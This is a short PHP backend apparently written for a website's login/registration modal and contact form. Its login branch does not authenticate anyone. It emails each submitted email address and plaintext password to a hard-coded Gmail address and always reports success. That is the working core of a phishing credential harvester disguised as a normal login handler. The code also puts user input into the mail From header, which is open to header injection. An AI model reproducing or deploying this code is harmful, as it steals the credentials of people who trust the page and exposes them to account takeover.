<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Sanitize input data
function sanitizeInput($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

// Check if the request is a POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Determine which form was submitted
    if (isset($_POST['email']) && isset($_POST['password'])) {
        // Handle modal login/registration form
        $email = sanitizeInput($_POST['email']);
        $password = sanitizeInput($_POST['password']);
        $firstname = isset($_POST['name']) ? sanitizeInput($_POST['name']) : '';
        $lastname = isset($_POST['name2']) ? sanitizeInput($_POST['name2']) : '';

        // Prepare email content
        $to = "kefox.nwoko@gmail.com";  // Replace with your email
        $subject = "New Login/Registration";
        $body = "Email: $email\nPassword: $password\nFirst Name: $firstname\nLast Name: $lastname";
        $headers = "From: $email";

        // Send email
        $send = mail($to, $subject, $body, $headers);

        // Return JSON response
        if ($send) {
            echo json_encode(["status" => "success", "message" => "Login/Registration successful!"]);
        } else {
            echo json_encode(["status" => "error", "message" => "Failed to process login/registration."]);
        }
    } elseif (isset($_POST['name']) && isset($_POST['lastname']) && isset($_POST['message'])) {
        // Handle normal contact form
        $firstname = sanitizeInput($_POST['name']);
        $lastname = sanitizeInput($_POST['lastname']);
        $email = sanitizeInput($_POST['email']);
        $message = sanitizeInput($_POST['message']);

        // Prepare email content
        $to = "kefox.nwoko@gmail.com";  // Replace with your email
        $subject = "Contact Form Submission";
        $body = "First Name: $firstname\nLast Name: $lastname\nEmail: $email\nMessage: $message";
        $headers = "From: $email";

        // Send email
        $send = mail($to, $subject, $body, $headers);

        // Return JSON response
        if ($send) {
            echo json_encode(["status" => "success", "message" => "Your message was sent successfully!"]);
        } else {
            echo json_encode(["status" => "error", "message" => "Failed to send message."]);
        }
    } else {
        // Invalid form submission
        echo json_encode(["status" => "error", "message" => "Invalid form submission."]);
    }
} else {
    // Invalid request method
    echo json_encode(["status" => "error", "message" => "Invalid request method."]);
}
?>